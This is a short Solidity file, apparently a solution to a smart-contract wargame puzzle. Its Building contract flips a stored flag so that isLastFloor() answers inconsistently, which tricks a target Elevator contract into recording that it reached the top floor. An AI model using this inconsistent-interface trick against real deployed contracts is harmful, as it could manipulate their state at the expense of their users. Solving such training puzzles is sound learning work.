// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256) external;
}

contract Building {
    bool public toggledTop;

    function isLastFloor(uint256) external returns (bool) {
        bool top = toggledTop;
        toggledTop = !toggledTop;
        return top;
    }

    function goToTop(address elevatorAddress) public {
        Elevator elevator = Elevator(elevatorAddress);
        elevator.goTo(1);
    }
}
